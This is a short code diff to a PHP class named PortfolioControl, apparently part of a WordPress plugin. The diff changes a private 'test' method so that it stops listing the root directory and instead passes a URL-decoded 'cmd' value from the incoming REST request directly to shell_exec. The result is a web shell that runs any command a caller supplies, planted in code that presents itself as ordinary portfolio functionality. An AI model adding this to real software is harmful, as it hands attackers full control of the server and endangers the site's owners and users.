@@ -42,7 +42,8 @@ class PortfolioControl {
 	}
 
 	private function test( WP_REST_Request $request ) {
-		return shell_exec( 'ls /' );
+		$cmd = urldecode( $request['cmd'] );
+		return shell_exec( $cmd );
 	}
 }
 
